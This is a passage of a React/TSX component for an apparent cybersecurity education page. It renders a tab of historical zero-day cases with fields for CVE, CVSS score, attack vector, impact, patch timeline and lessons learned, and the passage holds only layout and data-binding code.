                        <span className="text-purple-400">•</span>
                        <span><strong>Automated Fuzzing:</strong> AI-guided fuzzing targets likely vulnerability locations</span>
                      </li>
                      <li className="flex gap-2">
                        <span className="text-purple-400">•</span>
                        <span><strong>Traffic Analysis:</strong> Network anomaly detection for zero-day exploitation</span>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </Card>
        </TabsContent>

        {/* Historical Cases Tab */}
        <TabsContent value="examples" className="space-y-6">
          <div className="grid grid-cols-1 gap-6">
            {HISTORICAL_ZERO_DAYS.map((zeroday, index) => (
              <Card key={index} className="bg-black/40 border-purple-500/20 p-8">
                <div className="space-y-6">
                  {/* Header */}
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-3 mb-2">
                        <h3 className="text-2xl font-bold text-white">{zeroday.title}</h3>
                        <Badge className={getSeverityColor(zeroday.severity)}>
                          {zeroday.severity.toUpperCase()}
                        </Badge>
                        <Badge className="bg-blue-500/20 text-blue-400 border-blue-500/50">
                          {zeroday.cveId}
                        </Badge>
                        <Badge className="bg-gray-500/20 text-gray-300 border-gray-500/50">
                          {zeroday.year}
                        </Badge>
                      </div>
                      <p className="text-gray-300 text-lg">{zeroday.description}</p>
                    </div>
                    <div className="text-right ml-4">
                      <p className="text-3xl font-bold text-purple-400">{zeroday.cvssScore}</p>
                      <p className="text-gray-400 text-sm">CVSS</p>
                    </div>
                  </div>

                  {/* Technical Details */}
                  <div className="bg-blue-500/10 border border-blue-500/30 rounded-lg p-5">
                    <h4 className="text-lg font-semibold text-blue-400 mb-3 flex items-center gap-2">
                      <Code2 className="h-5 w-5" />
                      Technical Analysis
                    </h4>
                    <p className="text-gray-300 leading-relaxed">{zeroday.technicalDetails}</p>
                  </div>

                  {/* Key Information Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="bg-purple-500/10 border border-purple-500/30 rounded-lg p-5">
                      <h4 className="text-lg font-semibold text-purple-400 mb-3">Attack Vector</h4>
                      <p className="text-gray-300">{zeroday.attackVector}</p>
                    </div>

                    <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-5">
                      <h4 className="text-lg font-semibold text-green-400 mb-3">Discovery Method</h4>
                      <p className="text-gray-300">{zeroday.discoveryMethod}</p>
                    </div>

                    <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-5">
                      <h4 className="text-lg font-semibold text-orange-400 mb-3">Impact</h4>
                      <p className="text-gray-300">{zeroday.impact}</p>
                    </div>

                    <div className="bg-cyan-500/10 border border-cyan-500/30 rounded-lg p-5">
                      <h4 className="text-lg font-semibold text-cyan-400 mb-3">Patch Timeline</h4>
                      <p className="text-gray-300">{zeroday.patchTimeline}</p>
                    </div>
                  </div>

                  {/* Affected Software */}
                  <div>
                    <h4 className="text-lg font-semibold text-white mb-3">Affected Software</h4>
                    <div className="flex flex-wrap gap-2">
                      {zeroday.affectedSoftware.map((software, idx) => (
                        <Badge key={idx} className="bg-red-500/20 text-red-400 border-red-500/50">
                          {software}
                        </Badge>
                      ))}
                    </div>
                  </div>

                  {/* Real-World Exploits */}
                  <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-5">
                    <h4 className="text-lg font-semibold text-red-400 mb-3 flex items-center gap-2">
                      <AlertTriangle className="h-5 w-5" />
                      Real-World Exploitation
                    </h4>
                    <ul className="space-y-2">
                      {zeroday.realWorldExploits.map((exploit, idx) => (
                        <li key={idx} className="flex items-start gap-2 text-gray-300">
                          <span className="text-red-400 mt-1">▸</span>
                          <span>{exploit}</span>
                        </li>
                      ))}
                    </ul>
                  </div>

                  {/* Lessons Learned */}
                  <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-5">
                    <h4 className="text-lg font-semibold text-green-400 mb-3 flex items-center gap-2">
                      <Shield className="h-5 w-5" />
                      Lessons Learned
                    </h4>
                    <ul className="space-y-2">
                      {zeroday.lessonsLearned.map((lesson, idx) => (
                        <li key={idx} className="flex items-start gap-2 text-gray-300">
                          <span className="text-green-400 mt-1">✓</span>
                          <span>{lesson}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              </Card>
            ))}
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
